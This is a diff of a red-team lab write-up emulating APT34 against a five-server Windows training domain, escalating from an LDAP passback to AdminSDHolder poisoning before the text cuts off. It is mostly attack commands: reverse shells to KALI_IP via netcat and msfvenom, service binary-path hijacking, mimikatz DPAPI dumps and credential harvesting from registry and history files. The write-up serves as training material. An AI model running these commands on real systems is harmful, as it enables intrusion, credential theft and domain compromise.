@@ -1,8 +1,80 @@
-# SCENARIO 4: "HOLLOW CROWN" —  Red Team Testing Guide
+# APT34 — Operation HOLLOW CROWN
+## Red Team Exercise Write-Up — Range 4: Hollow Crown
 
-## SETUP: Set Your Variables
+> **Classification:** RESTRICTED — Internal Red Team Use Only
 
-Run this first on Kali to set all IPs for the session:
+| Field | Detail |
+|---|---|
+| **Environment** | 5 × Windows Server 2019 |
+| **Domain** | cyberange.local / CYBERANGE |
+| **Emulated Actor** | APT34 (OilRig / Helix Kitten / Cobalt Gypsy) |
+| **Attack Chain** | LDAP Passback → SQL Impersonation → Service Hijack → LAPS + DPAPI → AdminSDHolder → DCSync |
+| **End Goal** | Full Domain Compromise — DCSync of cyberange.local |
+
+---
+
+## 1. Executive Summary
+
+The chain runs across five hosts: a web frontend with a vulnerable LDAP configuration page, a MSSQL server, a development server running an exploitable service, a hardened jump host managed by LAPS, and the Domain Controller. Starting from an unauthenticated LDAP passback that leaks a service credential in cleartext, the operator pivots through SQL login impersonation, a service binary-path hijack, a LAPS-protected local admin password, and DPAPI-stored credentials, finishing with an AdminSDHolder DACL poisoning that yields Domain Admin and a full DCSync. No software exploit is required — every step abuses misconfiguration and excessive privilege.
+
+### Attack Chain at a Glance
+
+| Step | Source | Target | Technique | ATT&CK |
+|---|---|---|---|---|
+| 1 | Attacker (no creds) | SRV08-WEB | LDAP passback — capture `svc_ldap` cleartext bind | T1557 / T1552.001 |
+| 2 | svc_ldap | SRV09-SQL | SQL `IMPERSONATE` on `sa` → `xp_cmdshell` as `svc_dev` | T1134 / T1059.003 |
+| 3 | svc_dev | SRV10-DEV | Service binary-path hijack of `CorpBuildSvc` → `svc_build` → read LAPS | T1543.003 / T1574.011 |
+| 4 | svc_build | SRV11-JUMP | LAPS local-admin → DPAPI → `svc_itadmin` | T1555.004 / T1003 |
+| 5 | svc_itadmin | DC03 | AdminSDHolder WriteDACL → Domain Admins → DCSync | T1222 / T1003.006 |
+
+---
+
+## 2. Lab Environment
+
+### 2.1 Host Inventory
+
+| Hostname | OS | Role | Key Vulnerability |
+|---|---|---|---|
+| DC03.cyberange.local | Windows Server 2019 | Domain Controller + DNS | `svc_itadmin` holds WriteDACL on AdminSDHolder |
+| SRV08-WEB.cyberange.local | Windows Server 2019 | IIS Web Frontend | Admin panel (`admin/admin`) with an LDAP passback test feature; `web.config.bak` and a backup share leak the bind password |
+| SRV09-SQL.cyberange.local | Windows Server 2019 | MSSQL Server | `svc_ldap` granted `IMPERSONATE` on `sa`; `xp_cmdshell` reachable; SQL Agent runs as `svc_dev` |
+| SRV10-DEV.cyberange.local | Windows Server 2019 | Development Server | `CorpBuildSvc` runs as `svc_build`; `svc_dev` holds `SERVICE_CHANGE_CONFIG` on it; `svc_build` can read SRV11-JUMP's LAPS password |
+| SRV11-JUMP.cyberange.local | Windows Server 2019 | Jump Host | LAPS-managed local admin; `svc_itadmin` credentials cached in DPAPI |
+
+### 2.2 Domain Accounts
+
+| Account | Type | Group Membership | Purpose |
+|---|---|---|---|
+| svc_ldap | Service account | Domain Users | Web app LDAP bind account — INITIAL TARGET (`Ld@pB1nd#2025!`) |
+| svc_dev | Service account | Domain Users | SQL/SQL-Agent execution context (`D3v$3rv!c3#2025`) |
+| svc_build | Service account | Domain Users, LAPS-read on SRV11-JUMP | `CorpBuildSvc` identity — PIVOT TARGET (`Bu1ld@cc#2025!`) |
+| svc_itadmin | Service account | WriteDACL on AdminSDHolder | IT admin service account — ADMINSDHOLDER TARGET (`1tAdm!nSvc#2025`) |
+| admin_backup | Service account | Domain Admins | Backup DA used to validate persistence |
+| jparker, slee, mchen … (×10) | User accounts | Domain Users | Regular staff |
+
+### 2.3 Key Misconfigurations
+
+Five deliberate misconfigurations chain together to enable full domain compromise from an unauthenticated foothold:
+
+**LDAP passback on the web admin panel** — The SRV08-WEB admin console is reachable with default `admin/admin` credentials and exposes an LDAP configuration page with a "Test Connection" button. The application performs an LDAP simple bind to an operator-supplied server using the stored `svc_ldap` bind credentials. Pointing the server field at the attacker captures `svc_ldap`'s password in cleartext. The same password is additionally exposed in `web.config.bak`, in `infrastructure.html`, and in the `WebBackups$` share, providing three redundant capture paths.
+
+**Excessive SQL IMPERSONATE grant** — On SRV09-SQL, `svc_ldap` holds the `IMPERSONATE` permission on the `sa` login. `EXECUTE AS LOGIN = 'sa'` therefore grants full sysadmin context, which is used to enable and run `xp_cmdshell`. Command execution runs as the SQL service account `svc_dev`, and a SQL Agent CmdExec job runs in the same context.
+
+**Weak service DACL on CorpBuildSvc** — `svc_dev` holds `SERVICE_CHANGE_CONFIG` on the `CorpBuildSvc` service on SRV10-DEV, which runs as `svc_build`. Reconfiguring the service binary path and restarting it executes arbitrary commands as `svc_build`.
+
+**Over-broad LAPS read and cached DPAPI credentials** — `svc_build` has read access to the `ms-Mcs-AdmPwd` attribute on SRV11-JUMP's computer object, exposing the cleartext local admin password. With local admin/SYSTEM on SRV11-JUMP, the operator extracts DPAPI master keys and decrypts the cached `svc_itadmin` credentials.
+
+**WriteDACL on AdminSDHolder** — `svc_itadmin` holds `WriteDACL` on the `AdminSDHolder` object. Adding a GenericAll ACE and triggering SDProp propagates that ACE to every protected group, allowing the operator to add itself to Domain Admins. Because SDProp re-applies the ACE on each run, this also provides persistence.
+
+### 2.4 Boot Order
+
+Boot **DC03** first and wait 90 seconds for AD DS and DNS to fully initialise. The four member servers can then boot in any order. SRV09-SQL must complete service startup before Step 2, and SRV11-JUMP's LAPS rotation must have populated before Step 4. The lab is fully operational approximately 3–5 minutes after all five VMs are running.
+
+---
+
+## 3. Environment Setup
+
+All commands are run from a **Kali Linux** attacker machine with network access to the lab subnet. Set the session variables first:
 
 ```bash
 # Set these to your actual IPs
@@ -12,270 +84,199 @@ export WEB_IP=<srv08-web_ip>
 export SQL_IP=<srv09-sql_ip>
 export DEV_IP=<srv10-dev_ip>
 export JUMP_IP=<srv11-jump_ip>
-
 ```
+
+### 3.1 Required Tools
+
+| Tool | Purpose |
+|---|---|
+| nmap | Network discovery and port scanning |
+| nxc (NetExec) | SMB/LDAP/MSSQL enumeration, LAPS and DPAPI modules, local-auth checks |
+| responder / netcat | Rogue LDAP listener for the passback capture |
+| curl, smbclient | Web and SMB leak retrieval |
+| impacket (mssqlclient, psexec, wmiexec, smbserver, secretsdump, dacledit) | SQL access, remote execution, credential dumping, ACL edits |
+| evil-winrm | Interactive shells over WinRM |
+| msfvenom | Service-hijack payload generation |
+| mimikatz | DPAPI credential extraction (manual path) |
+| bloodyAD | AdminSDHolder ACL read/write |
+| ntpdate | Clock sync to DC for Kerberos |
 
 ---
 
-## STEP 0: RECON
+## Step 1 — LDAP Passback: Credential Capture
 
-### 0.1 — Find all hosts
+**Target:** `SRV08-WEB.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1557 — Adversary-in-the-Middle / T1552.001 — Credentials in Files
+
+### What This Step Does
+
+Captures the `svc_ldap` domain credential by forcing the web application's LDAP configuration test to bind against an attacker-controlled listener.
+
+### Why It Works
+
+The admin panel accepts default `admin/admin` credentials and lets the operator set the LDAP server address. The "Test Connection" action performs an LDAP simple bind — which transmits the bind DN and password in cleartext — to whatever address is supplied. Redirecting it to Kali yields `svc_ldap`'s password directly.
+
+### Phase 1a — Recon
 
 ```bash
 nmap -sn 192.168.x.0/24
-```
+nmap -p 88 --open 192.168.x.0/24      # DC (Kerberos)
+nmap -p 80 --open 192.168.x.0/24      # Web server
+nmap -p 1433 --open 192.168.x.0/24    # SQL server
 
-### 0.2 — Identify services
-
-```bash
-# DC (Kerberos)
-nmap -p 88 --open 192.168.x.0/24
-
-# Web server
-nmap -p 80 --open 192.168.x.0/24
-
-# SQL server
-nmap -p 1433 --open 192.168.x.0/24
-```
-
-### 0.3 — Full port scan on each host
-
-```bash
 nmap -sV -sC -p- $WEB_IP -oN web_scan.txt
 nmap -sV -sC -p- $SQL_IP -oN sql_scan.txt
 nmap -sV -sC -p- $DEV_IP -oN dev_scan.txt
 nmap -sV -sC -p- $JUMP_IP -oN jump_scan.txt
 nmap -sV -sC -p- $DC_IP -oN dc_scan.txt
-```
 
-### 0.4 — SMB share enumeration (anonymous)
-
-```bash
+# Anonymous SMB and LDAP enumeration
 nxc smb $WEB_IP $SQL_IP $DEV_IP $JUMP_IP $DC_IP --shares -u '' -p ''
-```
-
-### 0.5 — Anonymous LDAP enumeration
-
-```bash
 nxc ldap $DC_IP -u '' -p '' --users
 nxc ldap $DC_IP -u '' -p '' --groups
-```
 
-### 0.6 — Web enumeration
-
-```bash
-# Check root page
+# Web surface
 curl -s http://$WEB_IP/
-
-# Check /admin
 curl -s http://$WEB_IP/admin/
-
-# Check /docs
 curl -s http://$WEB_IP/docs/infrastructure.html
-
-# Check web.config.bak
 curl -s http://$WEB_IP/web.config.bak
-
-# Check hidden share
 smbclient //$WEB_IP/WebBackups$ -N -c "ls"
 ```
 
----
-
-## STEP 1: LDAP PASSBACK — SRV08-WEB
-
-### 1.1 — Start your rogue LDAP listener
-
-**Terminal 1** — pick one of these:
+### Phase 1b — Start the Rogue LDAP Listener
 
 ```bash
-# Option A: netcat (simplest — you'll see raw data)
+# Option A: netcat (simplest — raw bind data)
 sudo nc -nlvp 389
 ```
-
 ```bash
 # Option B: responder (cleanest output)
 sudo responder -I eth0 -wv
 ```
 
-### 1.2 — Trigger the passback
+### Phase 1c — Trigger the Passback
 
-Open a browser (or use curl for the login):
-
-1. Go to `http://<WEB_IP>/admin/`
-2. Login with `admin` / `admin`
-3. On the LDAP Configuration page, change **LDAP Server** to your Kali IP
+1. Browse to `http://<WEB_IP>/admin/`
+2. Log in with `admin` / `admin`
+3. On the LDAP Configuration page, set **LDAP Server** to your Kali IP
 4. Click **Test Connection**
 
-### 1.3 — Check your listener
-
-You should see the LDAP bind request with cleartext credentials:
+The listener receives the cleartext bind:
 
 ```
 svc_ldap / Ld@pB1nd#2025!
 ```
 
-### 1.4 — Verify the captured creds work
+### Phase 1d — Validate the Credential
 
 ```bash
 nxc smb $DC_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
-```
-
-Should show `[+]` with a successful auth.
-
-### 1.5 — Enumerate what svc_ldap can access
-
-```bash
-# SMB shares
 nxc smb $SQL_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local --shares
-
-# Check MSSQL access
 nxc mssql $SQL_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
 ```
 
----
+### Contingency C1 — Static Credential Leaks
 
-## TEST CONTINGENCY C1a: web.config.bak
+The same `svc_ldap` password is recoverable without the passback:
 
 ```bash
+# C1a — web.config.bak
 curl -s http://$WEB_IP/web.config.bak | grep -i password
-```
 
-Should show `Ld@pB1nd#2025!` in the LdapBindPassword value.
-
-## TEST CONTINGENCY C1b: infrastructure.html
-
-```bash
+# C1b — infrastructure.html
 curl -s http://$WEB_IP/docs/infrastructure.html | grep -i "pass"
-```
 
-Should show the LDAP bind password.
-
-## TEST CONTINGENCY C1c: WebBackups$ share
-
-```bash
-mkdir -p /tmp/webbackups
-cd /tmp/webbackups
+# C1c — WebBackups$ share (IIS export XML)
+mkdir -p /tmp/webbackups && cd /tmp/webbackups
 smbclient //$WEB_IP/WebBackups$ -N -c "prompt OFF; mget *"
 cat *
 ```
 
-Should show the LDAP bind password in the IIS export XML.
-
----
-
-## TEST SKIP-A: ForceChangePassword (svc_ldap → svc_build)
+### Alternate Path (Skip-A) — ForceChangePassword svc_ldap → svc_build
 
 ```bash
-# Try resetting svc_build's password using svc_ldap's access
 net rpc password svc_build 'TestSkipA!2025' -U "CYBERANGE/svc_ldap%Ld@pB1nd#2025!" -S $DC_IP
-```
-
-If it works, verify:
-
-```bash
 nxc smb $DC_IP -u svc_build -p 'TestSkipA!2025' -d cyberange.local
-```
-
-**IMPORTANT:** If you changed the password, change it back for the rest of the test:
-
-```bash
+# Revert for the rest of the run:
 net rpc password svc_build 'Bu1ld@cc#2025!' -U "CYBERANGE/svc_ldap%Ld@pB1nd#2025!" -S $DC_IP
 ```
 
+> **Step 1 Result:** `svc_ldap` (`Ld@pB1nd#2025!`) captured. Confirmed valid against the DC and granted MSSQL access on SRV09-SQL.
+
 ---
 
-## STEP 2: SQL IMPERSONATION — SRV09-SQL
+## Step 2 — SQL Login Impersonation
 
-### 2.1 — Connect to MSSQL as svc_ldap
+**Target:** `SRV09-SQL.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1134 — Access Token Manipulation / T1059.003 — Windows Command Shell
+
+### What This Step Does
+
+Escalates inside MSSQL from `svc_ldap` to `sa` via an `IMPERSONATE` grant, enables `xp_cmdshell`, and executes commands as `svc_dev`.
+
+### Why It Works
+
+`svc_ldap` holds `IMPERSONATE` on the `sa` login. `EXECUTE AS LOGIN = 'sa'` assumes full sysadmin rights, allowing `xp_cmdshell` to be enabled and run. The resulting commands execute in the security context of the SQL service account, `svc_dev`.
+
+### Phase 2a — Connect and Confirm the Impersonation Right
 
 ```bash
 impacket-mssqlclient 'CYBERANGE/svc_ldap:Ld@pB1nd#2025!@'$SQL_IP -windows-auth
 ```
-
-### 2.2 — Check IMPERSONATE privilege
-
-In the SQL shell:
-
 ```sql
-SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+SELECT DISTINCT b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';   -- returns: sa
 ```
 
-Should show `sa`.
-
-### 2.3 — Impersonate sa
+### Phase 2b — Impersonate sa and Enable xp_cmdshell
 
 ```sql
 EXECUTE AS LOGIN = 'sa';
-SELECT SYSTEM_USER;
+SELECT SYSTEM_USER;                         -- sa
+
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';                  -- cyberange\svc_dev
 ```
 
-Should show `sa`.
-
-### 2.4 — Enable xp_cmdshell and test
-
-```sql
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-EXEC xp_cmdshell 'whoami';
-```
-
-Should show `cyberange\svc_dev`.
-
-### 2.5 — Create SQL Agent Job for command execution
+### Phase 2c — Command Execution via SQL Agent Job
 
 ```sql
 USE msdb;
-
-#Delete the recore if created while testing
+-- Remove any stale test job first
 EXEC sp_delete_job @job_name = 'TestJob', @delete_unused_schedule = 1;
 
 EXEC sp_add_job @job_name = 'TestJob';
-EXEC sp_add_jobstep @job_name = 'TestJob', @step_name = 'run', @subsystem = 'CmdExec', @command = 'cmd /c whoami > C:\Users\Public\whoami.txt && ipconfig >> C:\Users\Public\whoami.txt';
+EXEC sp_add_jobstep @job_name = 'TestJob', @step_name = 'run', @subsystem = 'CmdExec',
+     @command = 'cmd /c whoami > C:\Users\Public\whoami.txt && ipconfig >> C:\Users\Public\whoami.txt';
 EXEC sp_add_jobserver @job_name = 'TestJob';
 EXEC sp_start_job @job_name = 'TestJob';
-
 ```
 
-Wait 5 seconds, then read:
+Wait 5 seconds, then read the result:
 
 ```sql
-EXEC xp_cmdshell 'type C:\Users\Public\whoami.txt';
+EXEC xp_cmdshell 'type C:\Users\Public\whoami.txt';   -- cyberange\svc_dev + network config
 ```
 
-Should show `cyberange\svc_dev` and the network config.
-
-### 2.6 — Get a reverse shell (optional but proves full chain)
-
-**Terminal 1** on Kali:
+### Phase 2d — Reverse Shell (proves full execution)
 
 ```bash
-nc -nlvp 4444
+nc -nlvp 4444                                          # Terminal 1
 ```
-
-**Terminal 2** on Kali:
-
 ```bash
-#Place nc.exe in the /opt/redteam/tools folder
-
+# Terminal 2 — place nc.exe in /opt/redteam/tools first
 impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
 ```
-
-In the SQL shell:
-
 ```sql
 USE msdb;
 EXEC sp_add_job @job_name = 'RevShell';
-EXEC sp_add_jobstep @job_name = 'RevShell', @step_name = 'run', @subsystem = 'CmdExec', @command = 'cmd /c net use \\KALI_IP\share /user:att att && \\KALI_IP\share\nc.exe -e cmd KALI_IP 4444';
+EXEC sp_add_jobstep @job_name = 'RevShell', @step_name = 'run', @subsystem = 'CmdExec',
+     @command = 'cmd /c net use \\KALI_IP\share /user:att att && \\KALI_IP\share\nc.exe -e cmd KALI_IP 4444';
 EXEC sp_add_jobserver @job_name = 'RevShell';
 EXEC sp_start_job @job_name = 'RevShell';
 ```
 
-You should get a shell as `cyberange\svc_dev` on Terminal 1.
-
-### 2.7 — Clean up test jobs
+### Phase 2e — Clean Up Test Jobs
 
 ```sql
 USE msdb;
@@ -283,459 +284,284 @@ EXEC sp_delete_job @job_name = 'TestJob', @delete_unused_schedule = 1;
 EXEC sp_delete_job @job_name = 'RevShell', @delete_unused_schedule = 1;
 ```
 
----
-
-## TEST SKIP-B: ServiceCredentials Table
-
-While still in the SQL shell:
+### Alternate Path (Skip-B) — ServiceCredentials Table
 
 ```sql
 USE DevAppDB;
-SELECT * FROM dbo.ServiceCredentials;
+SELECT * FROM dbo.ServiceCredentials;   -- 6 rows; row 4 = svc_itadmin / 1tAdm!nSvc#2025
 ```
-
-You should see 6 rows. Row 4 has `svc_itadmin` with `1tAdm!nSvc#2025`.
-
-Test it from Kali (new terminal):
-
 ```bash
 nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local
 ```
+If this validates, Steps 3 and 4 can be skipped and the operator can proceed directly to Step 5.
 
-Should show `[+]` — if it does, you could skip Steps 3+4 and go straight to Step 5.
-
----
-
-## TEST CONTINGENCY C2a: TRUSTWORTHY + db_owner
+### Contingency C2a — TRUSTWORTHY + db_owner
 
 ```sql
--- Revert to svc_ldap context first
 REVERT;
-SELECT SYSTEM_USER;  -- should show svc_ldap
-
--- Try TRUSTWORTHY chain
+SELECT SYSTEM_USER;          -- svc_ldap
 USE DevAppDB;
 EXECUTE AS USER = 'dbo';
-SELECT SYSTEM_USER;  -- should show 'dbo'
-
--- This gives you sa-equivalent in DevAppDB context
+SELECT SYSTEM_USER;          -- dbo
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
-
 REVERT;
 ```
 
-## TEST CONTINGENCY C2c: CLR Assembly
+### Contingency C2c — CLR Assembly
 
 ```sql
 USE DevAppDB;
-EXEC dbo.sp_clr_exec 'whoami';
+EXEC dbo.sp_clr_exec 'whoami';   -- cyberange\svc_dev
 ```
 
-Should return `cyberange\svc_dev`.
+> **Step 2 Result:** Command execution on SRV09-SQL as `cyberange\svc_dev` (`D3v$3rv!c3#2025`) via SQL impersonation. Reverse shell confirmed.
 
 ---
 
-## STEP 3: SERVICE BINARY PATH HIJACK — SRV10-DEV
+## Step 3 — Service Binary Path Hijack
 
-### 3.1 — Verify svc_dev can query CorpBuildSvc remotely
+**Target:** `SRV10-DEV.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1543.003 — Windows Service / T1574.011 — Services Registry Permissions Weakness
 
-From the svc_dev reverse shell (Step 2.6), or use nxc:
+### What This Step Does
+
+Reconfigures the `CorpBuildSvc` service to run an attacker payload, yielding a shell as `svc_build`, then reads the LAPS password for SRV11-JUMP.
+
+### Why It Works
+
+`svc_dev` holds `SERVICE_CHANGE_CONFIG` on `CorpBuildSvc`, which runs as `svc_build`. Changing the service binary path and restarting it executes arbitrary commands in the `svc_build` context. `svc_build` in turn can read SRV11-JUMP's `ms-Mcs-AdmPwd` LAPS attribute.
+
+### Phase 3a — Confirm Access to the Service
 
 ```bash
-# From Kali — test svc_dev creds first
 nxc smb $DEV_IP -u svc_dev -p 'D3v$3rv!c3#2025' -d cyberange.local
+evil-winrm -i $DEV_IP -u svc_dev -p 'D3v$3rv!c3#2025'   # shows CorpBuildSvc runs as svc_build
 ```
 
-From the shell on SRV09-SQL as svc_dev:
-
-```cmd
-evil-winrm -i $DEV_IP  -u svc_dev -p 'D3v$3rv!c3#2025'
-```
-
-Should show the service config with `svc_build` as the service account.
-
-### 3.2 — Test the hijack
-
-**Terminal 1** — Kali listener:
+### Phase 3b — Hijack the Binary Path
 
 ```bash
-nc -nlvp 4443
+nc -nlvp 4443                                            # Terminal 1
 ```
-
-**Terminal 2** — SMB server with payload:
-
 ```bash
+# Terminal 2 — payload + share
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI_IP LPORT=4443 -f exe -o /tmp/svc.exe
 impacket-smbserver share /tmp/ -smb2support -username att -password att
 ```
-
-From svc_dev shell on SRV09-SQL:
-
 ```cmd
 sc.exe stop CorpBuildSvc
 sc.exe config CorpBuildSvc binPath= "cmd /c net use \\<KALI_IP>\share /user:att att && \\<KALI_IP>\share\svc.exe"
 sc.exe start CorpBuildSvc
 ```
 
-Terminal 1 should get a shell as `cyberange\svc_build`.
+Terminal 1 receives a shell as `cyberange\svc_build`.
 
-### 3.3 — Read LAPS password as svc_build
+### Phase 3c — Read the LAPS Password for SRV11-JUMP
 
-From the Shell on SRV10-DEV as svc_build:
-
-```
+```cmd
 powershell -c "$s = New-Object DirectoryServices.DirectorySearcher; $s.Filter = '(cn=SRV11-JUMP)'; $s.PropertiesToLoad.Add('ms-Mcs-AdmPwd') | Out-Null; $r = $s.FindOne(); $r.Properties['ms-mcs-admpwd']"
 ```
-
-From Kali:
-
 ```bash
+# Or from Kali
 nxc ldap $DC_IP -u svc_build -p 'Bu1ld@cc#2025!' -M laps
 ```
 
-Should show the LAPS password for SRV11-JUMP.
-
-### 3.4 — Restore CorpBuildSvc (important for re-testing)
-
-From an admin shell on SRV10-DEV:
+### Phase 3d — Restore the Service (for re-testing)
 
 ```powershell
 sc.exe config CorpBuildSvc binPath= "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\BuildService\BuildMonitor.ps1 -Service"
 ```
 
----
-
-## TEST CONTINGENCY C3a: Unquoted Service Path
-
-From svc_dev shell on SRV10-DEV:
+### Contingency C3a — Unquoted Service Path
 
 ```cmd
-wmic service get name,pathname | findstr /v /i "C:\Windows" | findstr /i /v "\""
+wmic service get name,pathname | findstr /v /i "C:\Windows" | findstr /i /v "\""   # CorpDevTools
+icacls "C:\Program Files\Corp Dev"                                                  # Authenticated Users (M)
 ```
 
-Should show `CorpDevTools` with unquoted path.
-
-Check write access:
-
-```cmd
-icacls "C:\Program Files\Corp Dev"
-```
-
-Should show `Authenticated Users` with `(M)` Modify.
-
-### TEST CONTINGENCY C3b: NightlyBuildClean
+### Contingency C3b — Writable Scheduled Task
 
 ```cmd
 schtasks /query /tn "NightlyBuildClean" /fo LIST /v
-icacls "C:\BuildService\NightlyClean"
+icacls "C:\BuildService\NightlyClean"   # runs as svc_build, folder writable by Authenticated Users
 ```
 
-Should show task running as svc_build, and Authenticated Users with Modify on the folder.
-
-### TEST CONTINGENCY C3c: AlwaysInstallElevated
+### Contingency C3c — AlwaysInstallElevated
 
 ```cmd
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # 0x1
 ```
 
-Should show `0x1`.
+> **Step 3 Result:** Shell as `cyberange\svc_build` (`Bu1ld@cc#2025!`). SRV11-JUMP LAPS password retrieved.
 
 ---
 
-## STEP 4: LAPS + DPAPI — SRV11-JUMP
+## Step 4 — LAPS + DPAPI: Credential Extraction
 
-### 4.1 — Get the LAPS password
+**Target:** `SRV11-JUMP.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1555.004 — Credentials from Password Stores (DPAPI) / T1003 — OS Credential Dumping
+
+### What This Step Does
+
+Uses the LAPS password to gain local admin on SRV11-JUMP, then extracts the cached `svc_itadmin` credentials from DPAPI.
+
+### Why It Works
+
+The LAPS-managed local Administrator password grants full local admin on SRV11-JUMP. As local admin/SYSTEM, the operator decrypts DPAPI-protected credential blobs, recovering the `svc_itadmin` password stored on the host.
+
+### Phase 4a — Retrieve the LAPS Password and Authenticate
 
 ```bash
 nxc ldap $DC_IP -u svc_build -p 'Bu1ld@cc#2025!' -M laps
-```
-
-Note the password. Set it as a variable:
-
-```bash
 export LAPS_PW='<the_password_from_above>'
+
+nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth   # [+] (Pwn3d!)
+impacket-psexec ./Administrator:"$LAPS_PW"@$JUMP_IP            # or impacket-wmiexec
 ```
 
-### 4.2 — Authenticate to SRV11-JUMP
+### Phase 4b — Extract DPAPI Credentials
 
 ```bash
-nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth
+# Method 1 — nxc dpapi module (easiest)
+nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth --dpapi   # svc_itadmin / 1tAdm!nSvc#2025
 ```
-
-Should show `[+] (Pwn3d!)`.
-
-### 4.3 — Get a shell
-
 ```bash
-impacket-psexec ./Administrator:"$LAPS_PW"@$JUMP_IP
-```
-
-Or:
-
-```bash
-impacket-wmiexec ./Administrator:"$LAPS_PW"@$JUMP_IP
-```
-
-### 4.4 — Extract DPAPI credentials
-
-**Method 1: nxc --dpapi module (easiest)**
-
-```bash
-nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth --dpapi
-```
-
-Look for `svc_itadmin` with password `1tAdm!nSvc#2025`.
-
-**Method 2: Manual mimikatz (if nxc dpapi module isn't available)**
-
-Terminal on Kali:
-
-```bash
+# Method 2 — manual mimikatz
 impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
 ```
-
-From shell on SRV11-JUMP:
-
 ```cmd
 net use \\<KALI_IP>\share /user:att att
 copy \\<KALI_IP>\share\mimikatz.exe C:\temp\m.exe
 C:\temp\m.exe "privilege::debug" "sekurlsa::dpapi" "exit"
-```
-
-Note the master key GUIDs and keys, then:
-
-```cmd
 dir C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Credentials\ /a
-```
-
-For each blob file:
-
-```cmd
 C:\temp\m.exe "dpapi::cred /in:C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Credentials\<BLOB_FILE>" "exit"
-```
-
-Or dump all vaults at once:
-
-```cmd
 C:\temp\m.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
 ```
 
-### 4.5 — Verify svc_itadmin creds
+### Phase 4c — Validate svc_itadmin
 
 ```bash
-nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local
+nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local   # [+]
 ```
 
-Should show `[+]`.
-
----
-
-## TEST CONTINGENCY C4a: AutoLogon Registry
+### Contingency C4a — AutoLogon Registry
 
 ```bash
 nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\" /v DefaultPassword"
-```
-
-Should show `J9m#Kx2v!Wq` for user `CorpAdmin`.
-
-Test it:
-
-```bash
 nxc smb $JUMP_IP -u CorpAdmin -p 'J9m#Kx2v!Wq' --local-auth
 ```
 
-## TEST CONTINGENCY C4b: PSReadline History
+### Contingency C4b — PSReadline History
 
 ```bash
 nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "type C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 ```
 
-Should show commands containing `1tAdm!nSvc#2025`.
-
-## TEST CONTINGENCY C4c: Unattend.xml
+### Contingency C4c — Unattend.xml
 
 ```bash
 nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "type C:\Windows\Panther\Unattend.xml"
+echo "<BASE64_VALUE>" | base64 -d | iconv -f UTF-16LE -t UTF-8   # strip trailing 'AdministratorPassword'
 ```
 
-Should show Base64-encoded password. Decode it:
-
-```bash
-echo "<BASE64_VALUE>" | base64 -d | iconv -f UTF-16LE -t UTF-8
-```
-
-Strip the trailing `AdministratorPassword` to get the real password.
+> **Step 4 Result:** `svc_itadmin` (`1tAdm!nSvc#2025`) recovered and validated against the DC. Account holds WriteDACL on AdminSDHolder.
 
 ---
 
-## STEP 5: ADMINSDHOLDER POISONING — DC03
+## Step 5 — AdminSDHolder Poisoning → Domain Admin → DCSync
 
-### 5.1 — Sync clock to DC (critical for Kerberos)
+**Target:** `DC03.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1222 — File and Directory Permissions Modification / T1003.006 — DCSync
+
+### What This Step Does
+
+Adds a GenericAll ACE to AdminSDHolder as `svc_itadmin`, forces SDProp to propagate it, adds the account to Domain Admins, and runs DCSync.
+
+### Why It Works
+
+`svc_itadmin` holds `WriteDACL` on the `AdminSDHolder` object. ACEs placed on AdminSDHolder are pushed by the SDProp process to all protected groups and their members (default cadence 60 minutes, or forced on demand). Granting itself GenericAll therefore yields the ability to add itself to Domain Admins, and the re-propagation makes the access self-healing.
+
+### Phase 5a — Sync Clock and Confirm WriteDACL
 
 ```bash
 sudo ntpdate $DC_IP
-```
 
-Or:
-
-```bash
-sudo date -s "$(nmap -p 445 --script smb2-time $DC_IP 2>/dev/null | grep 'date:' | awk '{print $2,$3}')"
-```
-
-### 5.2 — Verify svc_itadmin has WriteDACL on AdminSDHolder
-
-```bash
-# Using bloodyAD
 bloodyAD -d cyberange.local -u svc_itadmin -p '1tAdm!nSvc#2025' --host $DC_IP get writable --detail 2>/dev/null | grep -i adminsdholder
-```
-
-Or using impacket dacledit:
-
-```bash
+# or
